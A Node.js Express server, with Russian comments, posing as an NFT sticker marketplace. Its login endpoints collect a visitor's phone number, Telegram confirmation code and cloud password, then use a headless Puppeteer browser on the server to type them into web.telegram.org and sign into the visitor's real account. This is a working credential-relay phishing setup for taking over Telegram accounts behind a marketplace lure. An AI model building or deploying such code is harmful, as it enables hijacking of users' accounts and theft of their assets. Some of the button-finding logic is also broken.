import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';

// Динамический импорт puppeteer для избежания ошибок
let puppeteer;
try {
  puppeteer = (await import('puppeteer')).default;
  console.log('✅ Puppeteer загружен');
} catch (error) {
  console.log('❌ Puppeteer не установлен:', error.message);
  process.exit(1);
}

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data for NFTs
const sampleNFTs = [
  {
    id: 1,
    name: "Golden Star",
    description: "Блестящая золотая звезда",
    imageUrl: "https://via.placeholder.com/300x300/FFD700/000000?text=⭐",
    price: 0.99,
    category: "stickers",
    isAvailable: true
  },
  {
    id: 2,
    name: "Heart Gift",
    description: "Подарок в виде сердца",
    imageUrl: "https://via.placeholder.com/300x300/FF69B4/FFFFFF?text=💝",
    price: 1.49,
    category: "stickers",
    isAvailable: true
  }
];

// Хранилища
let users = [];
let authSessions = new Map();
let userSessions = new Map();

// 🔥 РЕАЛЬНАЯ АВТОМАТИЗАЦИЯ С PUPPETEER
class TelegramWebAutomation {
  constructor() {
    this.browser = null;
    this.page = null;
  }

  async init() {
    try {
      console.log('🚀 Запуск Puppeteer...');
      
      this.browser = await puppeteer.launch({
        headless: true,
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-accelerated-2d-canvas',
          '--no-first-run',
          '--no-zygote',
          '--disable-gpu',
          '--single-process',
          '--no-zygote'
        ],
        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || null
      });

      this.page = await this.browser.newPage();
      
      // Настройка User-Agent
      await this.page.setUserAgent(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
      );

      // Настройка viewport
      await this.page.setViewport({ width: 1280, height: 720 });

      console.log('✅ Puppeteer готов');
      return true;
      
    } catch (error) {
      console.error('❌ Ошибка инициализации Puppeteer:', error);
      return false;
    }
  }

  async enterPhoneNumber(phoneNumber) {
    try {
      console.log(`📱 Переход на web.telegram.org...`);
      
      // Переходим на Telegram Web
      await this.page.goto('https://web.telegram.org', { 
        waitUntil: 'networkidle2',
        timeout: 30000
      });

      // Ждем загрузки
      await this.page.waitForTimeout(3000);

      console.log(`📱 Ввод номера телефона: ${phoneNumber}`);
      
      // Ищем поле ввода телефона
      const phoneInput = await this.page.waitForSelector('input[type="tel"]', { timeout: 10000 });
      await phoneInput.click({ clickCount: 3 }); // Выделяем весь текст
      await phoneInput.type(phoneNumber, { delay: 100 });

      // Ищем кнопку "Next"
      const nextButton = await this.page.$('button.btn-primary') || 
                         await this.page.$('button[type="submit"]') ||
                         await this.page.$x('//button[contains(., "Next")]') ||
                         await this.page.$x('//button[contains(., "Далее")]');

      if (nextButton.length > 0) {
        await nextButton[0].click();
      } else {
        // Пробуем найти любую кнопку
        const anyButton = await this.page.$('button');
        if (anyButton) await anyButton.click();
      }

      console.log('✅ Номер введен, ожидание кода...');
      await this.page.waitForTimeout(5000);

      return { 
        success: true, 
        message: 'Бот ввел номер телефона. Код отправлен в официальный Telegram.' 
      };
      
    } catch (error) {
      console.error('❌ Ошибка ввода номера:', error);
      return { 
        success: false, 
        error: `Ошибка автоматизации: ${error.message}` 
      };
    }
  }

  async enterAuthCode(code) {
    try {
      console.log(`🔢 Ввод кода подтверждения: ${code}`);
      
      // Ищем поле для ввода кода
      const codeInput = await this.page.waitForSelector('input[type="text"]', { timeout: 10000 });
      await codeInput.click({ clickCount: 3 });
      await codeInput.type(code, { delay: 100 });

      // Ищем кнопку подтверждения
      const signInButton = await this.page.$('button.btn-primary') || 
                           await this.page.$('button[type="submit"]') ||
                           await this.page.$x('//button[contains(., "Sign In")]') ||
                           await this.page.$x('//button[contains(., "Войти")]');

      if (signInButton.length > 0) {
        await signInButton[0].click();
      } else {
        const anyButton = await this.page.$('button');
        if (anyButton) await anyButton.click();
      }

      console.log('✅ Код введен, проверка...');
      await this.page.waitForTimeout(5000);

      // Проверяем, не появилось ли поле для пароля
      const passwordField = await this.page.$('input[type="password"]');
      const requiresPassword = !!passwordField;

      if (requiresPassword) {
        console.log('🔒 Обнаружено поле для облачного пароля');
        return { 
          success: true, 
          requiresCloudPassword: true,
          message: 'Код подтвержден. Требуется облачный пароль.' 
        };
      } else {
        // Проверяем успешность авторизации по URL или элементам
        const currentUrl = this.page.url();
        const isLoggedIn = currentUrl.includes('/a/') || 
                          currentUrl.includes('/k/') ||
                          await this.page.$('.chat-list') ||
                          await this.page.$('.sidebar');

        if (isLoggedIn) {
          console.log('🎉 Авторизация успешна!');
          return { 
            success: true, 
            requiresCloudPassword: false,
            message: 'Авторизация успешна!' 
          };
        } else {
          return { 
            success: false, 
            error: 'Не удалось подтвердить код' 
          };
        }
      }
      
    } catch (error) {
      console.error('❌ Ошибка ввода кода:', error);
      return { 
        success: false, 
        error: `Ошибка ввода кода: ${error.message}` 
      };
    }
  }

  async enterCloudPassword(password) {
    try {
      console.log(`🔒 Ввод облачного пароля`);
      
      // Вводим пароль
      const passwordInput = await this.page.$('input[type="password"]');
      await passwordInput.click({ clickCount: 3 });
      await passwordInput.type(password, { delay: 100 });

      // Ищем кнопку подтверждения
      const submitButton = await this.page.$('button.btn-primary') || 
                           await this.page.$('button[type="submit"]') ||
                           await this.page.$x('//button[contains(., "Next")]');

      if (submitButton.length > 0) {
        await submitButton[0].click();
      } else {
        const anyButton = await this.page.$('button');
        if (anyButton) await anyButton.click();
      }

      console.log('✅ Пароль введен, завершение...');
      await this.page.waitForTimeout(5000);

      // Проверяем успешность авторизации
      const currentUrl = this.page.url();
      const isLoggedIn = currentUrl.includes('/a/') || 
                        currentUrl.includes('/k/') ||
                        await this.page.$('.chat-list');

      if (isLoggedIn) {
        console.log('🎉 Авторизация с паролем успешна!');
        return { 
          success: true, 
          message: 'Авторизация с облачным паролем успешна!' 
        };
      } else {
        return { 
          success: false, 
          error: 'Неверный облачный пароль' 
        };
      }
      
    } catch (error) {
      console.error('❌ Ошибка ввода пароля:', error);
      return { 
        success: false, 
        error: `Ошибка ввода пароля: ${error.message}` 
      };
    }
  }

  async close() {
    if (this.browser) {
      await this.browser.close();
      console.log('🔚 Браузер закрыт');
    }
  }

  async takeScreenshot() {
    try {
      const screenshot = await this.page.screenshot({ encoding: 'base64' });
      return screenshot;
    } catch (error) {
      console.log('❌ Не удалось сделать скриншот');
      return null;
    }
  }
}

// 🎯 API МАРШРУТЫ

app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'NFT Marketplace с реальным Puppeteer',
    puppeteer: 'active',
    timestamp: new Date().toISOString()
  });
});

app.get('/', (req, res) => {
  res.sendFile('frontend/index.html', { root: '.' });
});

app.get('/marketplace', (req, res) => {
  res.sendFile('frontend/marketplace.html', { root: '.' });
});

// 🔐 Шаг 1: Начало авторизации
app.post('/api/auth/start', async (req, res) => {
  try {
    const { phone } = req.body;
    
    console.log('📞 Начало реальной авторизации для:', phone);
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона' 
      });
    }

    // Проверка формата номера
    const phoneRegex = /^\+?[1-9]\d{1,14}$/;
    if (!phoneRegex.test(phone)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Неверный формат номера' 
      });
    }

    const sessionId = crypto.randomBytes(16).toString('hex');
    const automation = new TelegramWebAutomation();
    
    // Инициализация браузера
    const initResult = await automation.init();
    if (!initResult) {
      return res.status(500).json({ 
        success: false, 
        error: 'Не удалось запустить браузер' 
      });
    }

    // Бот вводит номер телефона
    const phoneResult = await automation.enterPhoneNumber(phone);
    if (!phoneResult.success) {
      await automation.close();
      return res.status(500).json({ 
        success: false, 
        error: phoneResult.error 
      });
    }

    // Сохраняем сессию
    authSessions.set(sessionId, {
      phone: phone,
      automation: automation,
      attempts: 0,
      createdAt: Date.now(),
      status: 'waiting_code'
    });

    console.log(`🤖 Создана сессия ${sessionId}`);

    res.json({
      success: true,
      sessionId: sessionId,
      message: '✅ Бот реально ввел номер на web.telegram.org! Код отправлен в официальный Telegram.',
      instruction: 'Проверьте официальный Telegram и введите код',
      isRealAutomation: true
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🔐 Шаг 2: Ввод кода
app.post('/api/auth/enter-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    
    console.log('🔐 Ввод кода для сессии:', sessionId);
    
    if (!sessionId || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите код и sessionId' 
      });
    }

    const authSession = authSessions.get(sessionId);
    if (!authSession) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    // Проверка времени
    if (Date.now() - authSession.createdAt > 10 * 60 * 1000) {
      await authSession.automation.close();
      authSessions.delete(sessionId);
      return res.status(400).json({ 
        success: false, 
        error: 'Время сессии истекло' 
      });
    }

    // Проверка попыток
    if (authSession.attempts >= 3) {
      await authSession.automation.close();
      authSessions.delete(sessionId);
      return res.status(400).json({ 
        success: false, 
        error: 'Слишком много попыток' 
      });
    }

    // Бот вводит код
    const codeResult = await authSession.automation.enterAuthCode(code);
    
    if (!codeResult.success) {
      authSession.attempts++;
      authSessions.set(sessionId, authSession);
      return res.status(400).json({ 
        success: false, 
        error: codeResult.error 
      });
    }

    // Обновляем статус
    authSession.status = codeResult.requiresCloudPassword ? 'need_password' : 'authenticated';
    authSessions.set(sessionId, authSession);

    if (codeResult.requiresCloudPassword) {
      res.json({
        success: true,
        message: '✅ Код подтвержден! Введите облачный пароль.',
        nextStep: 'cloud_password'
      });
    } else {
      await completeAuthentication(sessionId, authSession, res);
    }
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🔐 Шаг 3: Облачный пароль
app.post('/api/auth/cloud-password', async (req, res) => {
  try {
    const { sessionId, cloudPassword } = req.body;
    
    if (!sessionId || !cloudPassword) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите пароль' 
      });
    }

    const authSession = authSessions.get(sessionId);
    if (!authSession || authSession.status !== 'need_password') {
      return res.status(400).json({ 
        success: false, 
        error: 'Сначала введите код' 
      });
    }

    // Бот вводит пароль
    const passwordResult = await authSession.automation.enterCloudPassword(cloudPassword);
    
    if (!passwordResult.success) {
      return res.status(400).json({ 
        success: false, 
        error: passwordResult.error 
      });
    }

    await completeAuthentication(sessionId, authSession, res);
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера: ' + error.message 
    });
  }
});

// 🎯 Завершение авторизации
async function completeAuthentication(sessionId, authSession, res) {
  try {
    // Закрываем браузер
    await authSession.automation.close();

    // Создаем пользователя
    let user = users.find(u => u.phone === authSession.phone);
    const isNewUser = !user;
    
    if (!user) {
      user = {
        id: users.length + 1,
        phone: authSession.phone,
        telegramId: Math.floor(100000000 + Math.random() * 900000000),
        firstName: 'Telegram',
        lastName: 'User',
        username: `user${authSession.phone.replace('+', '')}`,
        isVerified: true,
        hasCloudPassword: authSession.status === 'need_password',
        createdAt: new Date(),
        lastLogin: new Date(),
        authMethod: 'puppeteer_automation'
      };
      users.push(user);
    }

    // Создаем сессию
    const userSessionId = crypto.randomBytes(32).toString('hex');
    userSessions.set(userSessionId, {
      userId: user.id,
      phone: user.phone,
      telegramId: user.telegramId,
      authMethod: 'puppeteer_automation',
      expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000
    });

    // Чистим auth сессию
    authSessions.delete(sessionId);

    console.log(`🎉 Реальная авторизация завершена для ${authSession.phone}`);

    res.json({
      success: true,
      message: '🎉 Бот успешно вошел в ваш аккаунт через web.telegram.org!',
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        authMethod: user.authMethod
      },
      sessionId: userSessionId
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка завершения: ' + error.message 
    });
  }
}

// 📱 Остальные API
app.get('/api/nft', async (req, res) => {
  try {
    const { category } = req.query;
    let nfts = sampleNFTs;
    
    if (category && category !== 'all') {
      nfts = sampleNFTs.filter(nft => nft.category === category);
    }
    
    res.json({ success: true, nfts });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/auth/verify-session', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Нужен sessionId' 
      });
    }

    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ 
        success: false, 
        error: 'Сессия недействительна' 
      });
    }

    const user = users.find(u => u.id === session.userId);
    if (!user) {
      return res.status(404).json({ 
        success: false, 
        error: 'Пользователь не найден' 
      });
    }

    res.json({
      success: true,
      user: {
        id: user.id,
        phone: user.phone,
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName
      }
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера' 
    });
  }
});

app.post('/api/auth/logout', async (req, res) => {
  try {
    const { sessionId } = req.body;
    
    if (sessionId) {
      userSessions.delete(sessionId);
    }
    
    res.json({
      success: true,
      message: 'Выход выполнен'
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера' 
    });
  }
});

// Дебаг
app.get('/api/debug', (req, res) => {
  res.json({
    puppeteer: 'active',
    authSessions: Array.from(authSessions.entries()).length,
    users: users.length,
    userSessions: userSessions.size
  });
});

// Очистка при завершении
process.on('SIGINT', async () => {
  console.log('🔚 Завершение работы...');
  for (const [sessionId, session] of authSessions) {
    await session.automation.close();
  }
  process.exit(0);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🤖 Real Puppeteer automation ready`);
  console.log(`🏠 http://localhost:${PORT}`);
});
